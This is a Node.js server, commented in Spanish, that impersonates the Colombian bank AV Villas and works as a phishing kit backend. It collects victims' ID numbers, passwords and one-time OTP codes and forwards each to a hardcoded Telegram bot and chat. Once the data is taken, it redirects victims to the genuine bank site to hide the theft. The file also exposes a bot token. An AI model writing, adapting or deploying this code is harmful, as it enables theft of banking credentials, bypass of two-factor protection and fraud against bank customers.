/**
 * AV Villas Co-banking Digital - Server
 * Servidor Node.js con Express, Socket.IO y Telegram Bot
 * 
 * CAMBIOS: Botones removidos, solo envía datos al chat
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ============================================
// CONFIGURACIÓN
// ============================================
const CONFIG = {
    PORT: 3000,
    TELEGRAM: {
        BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
        CHAT_ID: '-5029729816'
    },
    SOCKET: {
        CORS: {
            origin: "*",
            methods: ["GET", "POST"]
        },
        PING_TIMEOUT: 60000,
        PING_INTERVAL: 25000
    }
};

// ============================================
// INICIALIZACIÓN DEL SERVIDOR
// ============================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: CONFIG.SOCKET.CORS,
    pingTimeout: CONFIG.SOCKET.PING_TIMEOUT,
    pingInterval: CONFIG.SOCKET.PING_INTERVAL
});

// Middlewares
app.use(express.static(__dirname));
app.use(express.json());

// Crear bot de Telegram
// Por defecto NO hace polling para evitar 409 Conflict (mismo bot token compartido).
// Para correr esta banca AISLADA: set STANDALONE_BOT=1
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(CONFIG.TELEGRAM.BOT_TOKEN, { 
    polling: _POLL_TG,
    filepath: false
});

// ============================================
// GESTIÓN DE CLIENTES
// ============================================
class ClientManager {
    constructor() {
        this.clients = new Map();
    }

    add(socket) {
        this.clients.set(socket.id, {
            socket: socket,
            connectedAt: new Date(),
            ip: socket.handshake.address
        });
        console.log(`✅ Cliente conectado: ${socket.id} | Total: ${this.clients.size}`);
    }

    remove(socketId) {
        const client = this.clients.get(socketId);
        if (client) {
            this.clients.delete(socketId);
            console.log(`❌ Cliente desconectado: ${socketId} | Total: ${this.clients.size}`);
        }
    }

    broadcast(event, data) {
        let sent = 0;
        this.clients.forEach((client) => {
            try {
                client.socket.emit(event, data);
                sent++;
            } catch (error) {
                console.error(`Error al enviar a ${client.socket.id}:`, error.message);
            }
        });
        console.log(`📡 Evento "${event}" enviado a ${sent} clientes`);
        return sent;
    }

    getCount() {
        return this.clients.size;
    }

    getAll() {
        return Array.from(this.clients.values());
    }
}

const clientManager = new ClientManager();

// ============================================
// UTILIDADES
// ============================================
const Utils = {
    /**
     * Formatea la fecha actual
     */
    getCurrentDateTime: () => {
        return new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    },

    /**
     * Escapa caracteres especiales para Markdown V2
     */
    escapeMarkdown: (text) => {
        return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    },

    /**
     * Formatea un mensaje de error
     */
    formatError: (error) => {
        return {
            message: error.message,
            code: error.code,
            timestamp: new Date().toISOString()
        };
    }
};

// ============================================
// SERVICIO DE TELEGRAM
// ============================================
class TelegramService {
    static async sendLoginData(data) {
        try {
            const message = 
                `🔐 <b>NUEVA INFORMACIÓN DE LOGIN</b>\n\n` +
                `<b>Tipo de documento:</b> ${data.documentType}\n` +
                `<b>Número de documento:</b> <code>${data.documentNumber}</code>\n` +
                `<b>Contraseña:</b> <code>${data.password}</code>\n\n` +
                `<b>⏰ Recibido:</b> ${Utils.getCurrentDateTime()}\n` +
                `<b>👥 Clientes conectados:</b> ${clientManager.getCount()}`;

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                parse_mode: 'HTML'
            });

            console.log('✅ Datos de login enviados a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar login a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }

    static async sendOTP(data) {
        try {
            const message = 
                `📱 <b>CÓDIGO OTP RECIBIDO</b>\n\n` +
                `<b>Código:</b> <code>${data.otpCode}</code>\n\n` +
                `<b>⏰ Recibido:</b> ${Utils.getCurrentDateTime()}\n` +
                `<b>👥 Clientes conectados:</b> ${clientManager.getCount()}`;

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                parse_mode: 'HTML'
            });

            console.log('✅ Código OTP enviado a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar OTP a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }
}

// ============================================
// MANEJADORES DE SOCKET.IO
// ============================================
io.on('connection', (socket) => {
    clientManager.add(socket);

    socket.on('disconnect', (reason) => {
        clientManager.remove(socket.id);
        console.log(`Razón de desconexión: ${reason}`);
    });

    socket.on('login-data', async (data) => {
        console.log('📥 Datos de login recibidos:', {
            documentType: data.documentType,
            documentNumber: data.documentNumber,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendLoginData(data);
        socket.emit('telegram-sent', result);

        // Redirigir automáticamente a OTP después de 2 segundos
        setTimeout(() => {
            socket.emit('redirect', { page: 'otp' });
        }, 2000);
    });

    socket.on('otp-data', async (data) => {
        console.log('📥 Código OTP recibido:', {
            otpCode: data.otpCode,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendOTP(data);
        socket.emit('telegram-sent', result);

        // Redirigir automáticamente al sitio oficial después de 2 segundos
        setTimeout(() => {
            socket.emit('redirect', { page: 'finalize', url: 'https://www.avvillas.com.co/' });
        }, 2000);
    });

    socket.on('error', (error) => {
        console.error(`❌ Error en socket ${socket.id}:`, error.message);
    });
});

// ============================================
// RUTAS HTTP
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        clients: clientManager.getCount(),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Manejo de errores 404
app.use((req, res) => {
    res.status(404).send('Página no encontrada');
});

// ============================================
// INICIAR SERVIDOR
// ============================================
server.listen(CONFIG.PORT, () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 AV Villas Co-banking Digital - Servidor Iniciado');
    console.log('='.repeat(60));
    console.log(`✅ Servidor HTTP: http://localhost:${CONFIG.PORT}`);
    console.log(`✅ Socket.IO: Activo`);
    console.log(`✅ Bot de Telegram: Activo`);
    console.log(`✅ Chat ID: ${CONFIG.TELEGRAM.CHAT_ID}`);
    console.log(`🔒 Modo: Sin botones en vivo (solo envía datos al chat)`);
    console.log('='.repeat(60) + '\n');
});

// Manejo de errores no capturados
process.on('uncaughtException', (error) => {
    console.error('❌ Excepción no capturada:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Promise rechazada no manejada:', reason);
});